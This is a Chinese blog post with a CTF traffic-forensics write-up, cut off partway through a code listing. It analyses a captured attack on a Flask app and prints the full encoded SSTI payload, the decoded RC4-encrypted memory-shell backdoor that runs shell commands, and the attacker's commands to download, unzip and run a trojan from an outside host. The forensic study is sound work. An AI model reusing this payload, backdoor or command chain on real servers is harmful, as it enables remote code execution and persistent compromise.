<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="流量取证比赛的时候手慢了点，重新复现一下。 1要求找到成功登陆时的账号密码。直接全局搜login，发现了大量的登陆请求。回显为用户名或密码错误。因此从后往前搜索login（ctrl+b搜索上一个），发现有一个登录后回显302的，发现后面成为管理员。因此找到302回显的发包，即可发现账号密码为admin  zxcvbnm123 2要求找到SERCET_KEY的值，直接全局搜索即可。 SECRET_K">
<meta property="og:type" content="article">
<meta property="og:title" content="ciscn2026流量分析">
<meta property="og:url" content="http://example.com/2025/12/31/ciscn2026%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Kwan1&#39;s Blog">
<meta property="og:description" content="流量取证比赛的时候手慢了点，重新复现一下。 1要求找到成功登陆时的账号密码。直接全局搜login，发现了大量的登陆请求。回显为用户名或密码错误。因此从后往前搜索login（ctrl+b搜索上一个），发现有一个登录后回显302的，发现后面成为管理员。因此找到302回显的发包，即可发现账号密码为admin  zxcvbnm123 2要求找到SERCET_KEY的值，直接全局搜索即可。 SECRET_K">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-12-31T07:24:14.000Z">
<meta property="article:modified_time" content="2026-01-01T11:53:47.334Z">
<meta property="article:author" content="Kwan1">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/2025/12/31/ciscn2026%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/12/31/ciscn2026%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","path":"2025/12/31/ciscn2026流量分析/","title":"ciscn2026流量分析"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ciscn2026流量分析 | Kwan1's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Kwan1's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">平生养韬光 壮志藏心间</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">5.</span> <span class="nav-text">5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6"><span class="nav-number">6.</span> <span class="nav-text">6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">7.</span> <span class="nav-text">写在最后</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Kwan1"
      src="/images/image.png">
  <p class="site-author-name" itemprop="name">Kwan1</p>
  <div class="site-description" itemprop="description">无论云泥意贯一</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">4</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/31/ciscn2026%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/image.png">
      <meta itemprop="name" content="Kwan1">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Kwan1's Blog">
      <meta itemprop="description" content="无论云泥意贯一">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ciscn2026流量分析 | Kwan1's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ciscn2026流量分析
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-12-31 15:24:14" itemprop="dateCreated datePublished" datetime="2025-12-31T15:24:14+08:00">2025-12-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2026-01-01 19:53:47" itemprop="dateModified" datetime="2026-01-01T19:53:47+08:00">2026-01-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>流量取证<br>比赛的时候手慢了点，重新复现一下。</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>要求找到成功登陆时的账号密码。直接全局搜login，发现了大量的登陆请求。回显为用户名或密码错误。因此从后往前搜索login（ctrl+b搜索上一个），发现有一个登录后回显302的，发现后面成为管理员。因此找到302回显的发包，即可发现账号密码为admin  zxcvbnm123</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>要求找到SERCET_KEY的值，直接全局搜索即可。 SECRET_KEY&#39;: &#39;c6242af0-6891-4510-8432-e1cdf051f160&#39;</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>要求获取内存马的加密密钥<br>继续看下面的包，发现preview_content&#x3D;，疑似ssti内存马注入。ssti注入内存马一般是通过http协议进行通信，继续往下看http协议包。过滤并保留http协议包，发现下一个包内就发送了很多奇怪的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preview_content=&#123;&#123;url_for.<span class="property">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;import base64; exec(base64.b64decode(&#x27;XyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX1s6Oi0xXSkpOwpleGVjKChfKShiJz1jNENVM3hQKy8vdlB6ZnR2OGdyaTYzNWEwVDFyUXZNbEtHaTNpaUJ3dm02VEZFdmFoZlFFMlBFajdGT2NjVElQSThUR3FaTUMrbDlBb1lZR2VHVUFNY2Fyd1NpVHZCQ3YzN3lzK04xODVOb2NmbWpFL2ZPSGVpNE9uZTBDTDVUWndKb3BFbEp4THI5VkZYdlJsb2E1UXZyamlUUUtlRytTR2J5Wm0rNXpUay9WM25aMEc2TmVhcDdIdDZudSthY3hxc3Ivc2djNlJlRUZ4ZkVlMnAzMFlibXl5aXMzdWFWMXArQWowaUZ2cnRTc01Va2hKVzlWOVMvdE8rMC82OGdmeUtNL3lFOWhmNlM5ZUNEZFFwU3lMbktrRGlRazk3VFV1S0RQc09SM3BRbGRCL1VydmJ0YzRXQTFELzljdFpBV2NKK2pISkwxaytOcEN5dktHVmh4SDhETEw3bHZ1K3c5SW5VLzl6dDFzWC9Uc1VSVjdWMHhFWFpOU2xsWk1acjFrY0xKaFplQjhXNTl5bXhxZ3FYSkpZV0ppMm45NmhLdFNhMmRhYi9GMHhCdVJpWmJUWEZJRm1ENmtuR3ovb1B4ZVBUenVqUHE1SVd0OE5abXZ5TTVYRGcvTDhKVS9tQzRQU3ZYQStncWV1RHhMQ2x6Uk5ESEpVbXZ0a2FMYkp2YlpjU2c3VGdtN1VTZUpXa0NRb2pTaStJTklFajVjTjErRkZncEtSWG40Z1I5eXAzL1Y3OVduU2VFRklPNkM0aGNKYzRtd3BrKzA5dDF5dWU0K21BbGJobHhuWE0xUGZrK3NHQm1hVUZFMWtFak9wbmZHbnFzVithdU9xakpnY0RzaXZJZCt3SFBIYXp0NU1WczRySFJoWUJPQjZ5WGp1R1liRkhpM1hLV2hiN0FmTVZ2aHg3RjlhUGpObUlpR3FCVS9oUkZVdU1xQkNHK1ZWVVZBYmQ1cEZEVFpKM1A4d1V5bTZRQUFZUXZ4RytaSkRSU1F5cE9oWEsvTDRlRkZ0RXppdWZaUFN5cllQSldKbEFRc0RPK2RsaTQ2Y24xdTVBNUh5cWZuNHZ3N3pTcWUrVlVRL1JpL0tudjBwUW9XSDFkOWRHSndEZnFtZ3ZuS2krZ05SdWdjZlVqRzczVjZzL3RpaGx0OEIyM0t2bUp6cWlMUHptdWhyMFJGVUpLWmpHYTczaUxYVDRPdmxoTFJhU2JUVDR0cS9TQ2t0R1J5akxWbVNqMmtyMEdTc3FUamxMMmw2Yy9jWEtXalJNdDFrTUNtQ0NUVithSmU0bnB2b0I5OU9NbktuWlI0WXM1MjZtVEZUb1N3YTVqbXhCbWtSWUNtQTgyR0ZLN2FrNmJJUlRmRE1zV0dzWnZBRVh2M1BmdjVOUnpjSUZOTzN0YlFrZUIvTElWT1c1TGZBa21SNjgvNnpyTDBEWm9QanpGWkk1VkxmcTBydjlDd1VlSmtSM1BIY3VqKytkL2xPdms4L2gzSHpTZ1lUR0N3bDF1ano4aDRvVWlQeUdUNzROamJZN2ZKOHZVSHFOeitaVmZPdFZ3L3ozUk11cVNVekVBS3JqY1UyRE5RZWhCMG9ZN3hJbE9UOXU5QlQ0Uk9vREZvKzVaRjZ6Vm9IQTRlSWNrWFVPUDN5cFF2NXBFWUcrMHBXNE15SG1BUWZzT2FXeU1kZk1vcWJ3L005b0ltZEdLZEt5MVdxM2FxK3QreHV5VmROQVFNaG9XMkE3elF6b2I4WEdBM0c4VnVvS0hHT2NjMjVIQ2IvRlllU3hkd3lJZWRBeGtsTExZTUJIb2pUU3BEMWRFeG96ZGk4OUdpa2h6MzMwNW5kVG1FQ3YwWm9VT0hhY25xdFVVaEpseTdWZ3ZYK0psYXdBWTlvck5QVW1aTTdRS2JkT2tUZi9vOGFRbFM1RmUveFFrT01KR200TlhxTGVoaVJJYjkyNXNUZlZ4d29OZlA1djFNR2xhcllNaWZIbDJyRXA1QzcxaXBGanBBR2FFcDluUmowSmdFYTRsU1R1WWVWWHdxYlpRVDNPZlF2Z3QvYkhKbEFndXFTV3lzR2hxaElUSllNNlQxMG03MUppd2ZRSDVpTFhINVhiRms1M1FHY0cyY0FuRnJXeTcweEV2YWJtZjB1MGlrUXdwVTJzY1A4TG9FYS9DbEpuUFN1V3dpY01rVkxya1pHcW5CdmJrNkpUZzdIblQwdkdVY1Y2a2ZmSUw2Q0szYkUxRnkwUjZzbCtVUG9ZdmprZ1NJM1ViZkQ2N2JSeEl4ZWdCcFlUenlDRHpQeXRTRSthNzdzZHhzZ2hMcFVDNWh4ejRaZVhkeUlyYm1oQXFRdzVlRW5CdUFTRTVxVE1Ka1RwLy9oa3krZFQycGNpT0JZbi9BQ1NMeHByTFowQXkxK3pobCtYeVY5V0ZMNE5nQm9IMzRidmt4SDM2bmN0c3pvcFdHUHlkMTRSaVM0ZDBFcU5vY3F2dFd1M1l4a05nUCs4Zk0vZC9CMGlreEt4aC9HamttUVhhU1gvQis0MFU0YmZTYnNFSnBWT3NUSFR5NnUwTnI2N1N3N0J2Und1VnZmVDAvOGo3M2dZSEJPMmZHU0lKNDdBcllWbTIrTHpSVDBpSDVqN3lWUm1wdGNuQW44S2t4SjYzV0JHYjd1M2JkK0QrM3lsbm0xaDRBUjdNR042cjZMeHBqTmxBWDExd2EvWEIxek44Y1dVTm5DM1ZjemZ3VUV3UGZpNWR5bzluRUM1V085VW03OFdLUnJtM2M0OEl2VFVoZ2ROZVFFRG9zSWZoTVNtaWtFbHVRWDhMY0NSY0s5ZVVUODVidnI1SjVyekViK0R1aUdZeURGRzdQWmVmdkliM3czM3UycTh6bHhsdFdDU3RjNU80cThpV3JWSTd0YVpIeG93VHc1ekpnOVRkaEJaK2ZRclF0YzB5ZHJCbHZBbG5ZMTB2RUNuRlVCQSt5MWxXc1ZuOGNLeFVqVGRhdGk0QUYzaU0vS3VFdFE2Wm44Ykk0TFl3TWxHbkNBMVJHODhKOWw3RzRkSnpzV3I5eE9pRDhpTUkyTjFlWmQvUVV5NDNZc0lMV3g4MHlpQ3h6K0c0YlhmMnFOUkZ2Tk9hd1BTbnJwdjZRMG9GRVpvamx1UHg3Y09VMjdiQWJncHdUS28wVlV5SDZHNCt5c3ZpUXpVN1NSZDUxTEdHM1U2Y1QwWURpZFFtejJld3Ria2tLY0dWY1N5WU9lQ2xWNkNSejZiZEYvR20zVDIrUTkxNC9sa1piS3gxOVduWDc4cit4dzZicGp6V0xyMEUxZ2puS0NWeFcwWFNud2UraUc5ZGtHOG5DRmZqVWxoZFRhUzFnSjdMRnNtVWpuOHUvdlJRYlJMdy95NjZJcnIveW5LT0N6Uk9jZ3JuREZ4SDN6M0pUUVFwVGlEcGV5elJzRjRTbkdCTXY1SGJyK2NLNllUYTRNSWJmemo1VGkzRk1nSk5xZ0s1WGs5aHNpbEdzVTZ0VWJucDZTS2lKaFV2SjhicXluVU1Fem5kbCtTK09WUkNhSDJpSmw4VTNXanlCNjhScTRIQVRrL2NLN0xrSkhITWpDM1c3ZFRtT0JwZm9XTVZFTGFMK1JrcVdZdjBDcFc1cUVOTGxuT1BCckdhR05lSVphaHpibnJ1RVBJSVhHa0d6MWZFNWQ0Mk1hS1pzQ1VZdDF4WGlhaTkrY2JLR2ovZDBsSUNxN3VjN2JSaEVCeDQ2RHlCWFR6MWdmSm5UMnVyNng0QXZiNXdZMnBjWXJjRDJPUjZBaWtNdm0yYzBiaGFiSkI2bzBEaE9OSjRsQ3htS2RHQnp1d3J0czF1MEQyeXVvMzd5TExmc0dEdXllcE53OGx5VE5jMm55aENWQmZXMjNEbkJRbVdjMVFMQ29ScHBWaGpLWHdPcE9ES084UjhZSG5RTStyTGs2RU9hYkNkR0s1N2lSek1jVDN3YzQzNmtWbUhYRGNJMFpzWUdZNWFJQzVEYmRXalV0Mlp1VTBMbXVMd3pDVFM5OXpoT29POERLTnFiSzRiSU5MeUFJMlg5Mjh4aWIraG1JT3FwM29TZ0MyUGRGYzh5cXRoTjlTNTVvbXRleDJ4a0VlOENZNDhDNno0SnRxVnRxaFBRV1E4a3RlNnhsZXBpVllDcUliRTJWZzRmTi8vTC9mZi91Ly85cDRMejd1cTQ2eVdlbmtKL3g5MGovNW1FSW9yczVNY1N1Rmk5ZHlneXlSNXdKZnVxR2hPZnNWVndKZScpKQ==&#x27;))&quot;</span>, &#123;<span class="string">&#x27;request&#x27;</span>:url_for.<span class="property">__globals__</span>[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.<span class="property">__globals__</span>[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到其经过base64加密。放到cycberchef里解密一下看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = <span class="keyword">lambda</span> __ : <span class="built_in">__import__</span>(<span class="string">&#x27;zlib&#x27;</span>).decompress(<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64decode(__[::-<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">exec</span>((_)(<span class="string">b&#x27;=c4CU3xP+********&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>这里可以看到，先经过反转，然后base64解密，zlib解压缩。尝试解密一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cdata = <span class="string">b&#x27;**&#x27;</span></span><br><span class="line">mdata= cdata[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(mdata)</span><br><span class="line">mdata = base64.b64decode(mdata)</span><br><span class="line">outdata = zlib.decompress(mdata)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解压后代码：<span class="subst">&#123;outdata&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&quot;exec((_)(b&#x27;=Mh9tF+P7**************&#x27;))&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>发现解密出的代码仍旧是exec((<em>)(b’****’))的形式，存在嵌套加密。也就是说，恶意代码是<br>exec((</em>)(b’exec((<em>)(b’exec((</em>)(b’exec((<em>)(b’exec((</em>)(b’***)))))))))) 这种的形式，我们需要逐层提取载荷，一直解压到最后。<br>exp为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">b&quot;exec\(\(_\)\(b&#x27;([^&#x27;]+)&#x27;\)\)&quot;</span> </span><br><span class="line">cdata = <span class="string">b&#x27;**************************************&#x27;</span></span><br><span class="line">mdata= cdata[::-<span class="number">1</span>]</span><br><span class="line">mdata = base64.b64decode(mdata)</span><br><span class="line">outdata = zlib.decompress(mdata)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(_)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解压后代码：<span class="subst">&#123;outdata&#125;</span>&quot;</span>)</span><br><span class="line">    outdata =re.search(pattern, outdata).group(<span class="number">1</span>).decode(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(outdata)</span><br><span class="line">    outdata=outdata[::-<span class="number">1</span>]</span><br><span class="line">    outdata=base64.b64decode(outdata)</span><br><span class="line">    outdata=zlib.decompress(outdata)</span><br></pre></td></tr></table></figure>
<p>提取出来的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> exc_class</span><br><span class="line"><span class="keyword">global</span> code</span><br><span class="line"><span class="keyword">import</span> os,binascii</span><br><span class="line">exc_class, code = app._get_exc_class_and_code(<span class="number">404</span>)</span><br><span class="line">RC4_SECRET = b\<span class="string">&#x27;v1p3r_5tr1k3_k3y\&#x27;</span></span><br><span class="line"><span class="string">def rc4_crypt(data: bytes, key: bytes) -&gt; bytes:</span></span><br><span class="line"><span class="string">    S = list(range(256))</span></span><br><span class="line"><span class="string">    j = 0</span></span><br><span class="line"><span class="string">    tfor i in range(256):j = (j + S[i] + key[i % len(key)]) % 256</span></span><br><span class="line"><span class="string">    S[i], S[j] = S[j], S[i]</span></span><br><span class="line"><span class="string">    i = j = 0</span></span><br><span class="line"><span class="string">    res = bytearray()</span></span><br><span class="line"><span class="string">    for char in data:</span></span><br><span class="line"><span class="string">        i = (i + 1) % 256</span></span><br><span class="line"><span class="string">        j = (j + S[i]) % 256</span></span><br><span class="line"><span class="string">        S[i], S[j] = S[j], S[i]</span></span><br><span class="line"><span class="string">        res.append(char ^ S[(S[i] + S[j]) % 256])</span></span><br><span class="line"><span class="string">        return bytes(res)</span></span><br><span class="line"><span class="string">        def backdoor_handler():</span></span><br><span class="line"><span class="string">            if request.headers.get(\&#x27;X-Token-Auth\&#x27;) != \&#x27;3011aa21232beb7504432bfa90d32779\&#x27;:</span></span><br><span class="line"><span class="string">                return &quot;Error&quot;</span></span><br><span class="line"><span class="string">                enc_hex_cmd = request.form.get(\&#x27;data\&#x27;)</span></span><br><span class="line"><span class="string">                if not enc_hex_cmd:</span></span><br><span class="line"><span class="string">                    return &quot;&quot;</span></span><br><span class="line"><span class="string">                    try:enc_cmd = binascii.unhexlify(enc_hex_cmd)</span></span><br><span class="line"><span class="string">                    cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(\&#x27;utf-8\&#x27;, errors=\&#x27;ignore\&#x27;)</span></span><br><span class="line"><span class="string">                    output_bytes = getattr(os, \&#x27;popen\&#x27;)(cmd).read().encode(\&#x27;utf-8\&#x27;, errors=\&#x27;ignore\&#x27;)</span></span><br><span class="line"><span class="string">                    enc_output = rc4_crypt(output_bytes, RC4_SECRET)</span></span><br><span class="line"><span class="string">                    return binascii.hexlify(enc_output).decode()</span></span><br><span class="line"><span class="string">                    except:</span></span><br><span class="line"><span class="string">                        return &quot;Error&quot;</span></span><br><span class="line"><span class="string">                        app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()</span></span><br></pre></td></tr></table></figure>
<p>一个rc4加密的内存马。很明确了，密钥是<br>v1p3r_5tr1k3_k3y</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>要求找到内存马的名字。</p>
<p>接下来继续看后面的包。根据这个内存马，后面的数据都存在这个data里面。逐个查看data并解密即可知道执行了什么命令。<br>其分别执行了<br>id<br>ls -al<br>curl 192.168.1.201:8080&#x2F;shell.zip -o &#x2F;tmp&#x2F;123.zip<br>这里的下一个http包中就get了一个shell.zip<br>然后通过打开Hypertext Transfer Protocol，在media type这里导出分组字节流即可获取到压缩包。<br>或者通过复制as a hex stream的方式放到cycberchef里，然后fromhex 导出也可。注意如果用其他方式复制，可能会导致一些不可显示的数据丢失掉，导致不能正常生成压缩包。</p>
<p>可以看到压缩包里面有一个shell，但是被加密了。<br>继续看下面的通信：<br>unzip -P nf2jd092jd01 -d &#x2F;tmp &#x2F;tmp&#x2F;123.zip<br>mv &#x2F;tmp&#x2F;shell &#x2F;tmp&#x2F;python3.13<br>chmod +x &#x2F;tmp&#x2F;python3.13<br>&#x2F;tmp&#x2F;python3.13</p>
<p>可以看到，解压密码是nf2jd092jd01<br>这里还把木马重命名为pyhton3.13，可见其名字就是pyhton3.13了。这里启动木马后，通信就不通过http方式了，因此后面也没有http包。</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>要求找到shell的通信密钥。<br>之前我们已经拿到了shell的本题，直接去分析shell文件即可。<br>进入主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 